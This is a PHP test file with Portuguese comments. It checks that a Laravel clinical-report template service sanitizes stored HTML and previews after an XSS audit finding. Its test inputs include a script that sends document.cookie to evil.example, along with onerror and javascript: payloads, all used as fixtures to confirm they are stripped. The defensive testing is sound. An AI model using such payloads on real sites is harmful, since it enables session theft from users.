<?php

declare(strict_types=1);

/**
 * EE-01 (auditoria de encerramento 11/10/2026): ReportSettingService::
 * syncContents() persistia content de modelo/template CRU, sem
 * sanitização — report_setting_preview_html.blade.php emitia
 * {!! $content->content !!} direto, e um <script> sobrevivia inteiro até
 * o navegador de quem abrisse a prévia (iframe sem sandbox, mesma
 * origem). Fix em duas camadas: sanitiza ANTES de persistir (não deixa
 * HTML executável nunca mais entrar) e sanitiza DE NOVO na renderização
 * via ReportSettingContent::sanitizedContent() (protege linha legada já
 * gravada antes desta correção, sem precisar reescrever/rehash content).
 */

use App\Enums\{DocumentationType, ReportSettingStatus};
use App\Models\{Entity, ReportSetting, ReportSettingContent, User};

function reportSettingSanitizationSaasAdminSession(Entity $saas): array
{
    return [
        'selected_entity_id'        => $saas->id,
        'selected_entity_is_client' => false,
        'selected_entity_user_rule' => 'admin',
    ];
}

beforeEach(function () {
    $this->saas  = Entity::factory()->create(['is_client' => false, 'active' => true]);
    $this->admin = User::factory()->create();
    createEntityUser($this->saas, $this->admin, 'admin');
});

it('[GAP] <script>/onerror/javascript: no content do modelo nunca são persistidos — achado via auditoria de encerramento (EE-01)', function () {
    $response = $this->actingAs($this->admin)
        ->withSession(reportSettingSanitizationSaasAdminSession($this->saas))
        ->postJson(route('manager.report-settings.store'), [
            'title'    => 'Modelo com tentativa de XSS',
            'contents' => [[
                'type'    => DocumentationType::Report->value,
                'label'   => 'Padrão',
                'content' => '<p>Achados normais.</p>'
                    . '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>'
                    . '<img src="x" onerror="alert(1)">'
                    . '<a href="javascript:alert(2)">clique</a>',
            ]],
        ]);

    $response->assertOk();
    $content = ReportSettingContent::query()->firstOrFail();

    expect($content->content)->toContain('Achados normais.')
        ->and($content->content)->not->toContain('<script')
        ->and($content->content)->not->toContain('onerror')
        ->and($content->content)->not->toContain('javascript:');
});

it('[GAP] formatação clínica e placeholders {{VAR}} sobrevivem à sanitização — não é texto puro indiscriminado', function () {
    $this->actingAs($this->admin)
        ->withSession(reportSettingSanitizationSaasAdminSession($this->saas))
        ->postJson(route('manager.report-settings.store'), [
            'title'    => 'Modelo com formatação',
            'contents' => [[
                'type'    => DocumentationType::Report->value,
                'label'   => 'Padrão',
                'content' => '<p><strong>Paciente:</strong> {{NOME_PACIENTE}}</p><ul><li>Item 1</li></ul>'
                    . '<table><tr><td>Célula</td></tr></table>',
            ]],
        ])->assertOk();

    $content = ReportSettingContent::query()->firstOrFail();

    expect($content->content)->toContain('<strong>Paciente:</strong>')
        ->and($content->content)->toContain('{{NOME_PACIENTE}}')
        ->and($content->content)->toContain('<li>Item 1</li>')
        ->and($content->content)->toContain('<table>');
});

it('[GAP] linha legada (gravada com <script> antes da correção) renderiza sanitizada na prévia, sem reescrever o registro — achado via auditoria de encerramento (EE-01)', function () {
    $setting = ReportSetting::create([
        'entity_id' => null,
        'title'     => 'Modelo legado',
        'status'    => ReportSettingStatus::Draft,
    ]);
    // Simula uma linha gravada ANTES desta correção — direto no banco,
    // sem passar por syncContents() (que agora sanitiza no salvar).
    $legacy = ReportSettingContent::query()->create([
        'report_setting_id' => $setting->id,
        'type'              => DocumentationType::Report,
        'label'             => 'Padrão',
        'content'           => '<p>Achados.</p><script>alert(1)</script>',
    ]);

    // content CRU continua como estava gravado — a correção nunca
    // reescreve/rehash um registro existente (mudaria o fingerprint de
    // cópias já adotadas pelas clínicas).
    expect($legacy->content)->toContain('<script');
    // sanitizedContent() (o que a prévia de fato usa) protege na hora de exibir.
    expect($legacy->sanitizedContent())->toContain('Achados.')->and($legacy->sanitizedContent())->not->toContain('<script');

    $preview = $this->actingAs($this->admin)
        ->withSession(reportSettingSanitizationSaasAdminSession($this->saas))
        ->get(route('manager.report-settings.preview', $setting));

    $preview->assertOk();
    expect($preview->getContent())->not->toContain('<script>alert(1)</script>');
});

it('[SEGURANÇA] iframe da prévia (manager) usa sandbox vazio — nunca executa script mesmo se algo escapar da sanitização', function () {
    $component = file_get_contents(base_path('resources/js/Pages/Panel/Manager/ReportSettings/ReportSettingPreviewModal.vue'));

    expect($component)->toContain('sandbox=""');
});
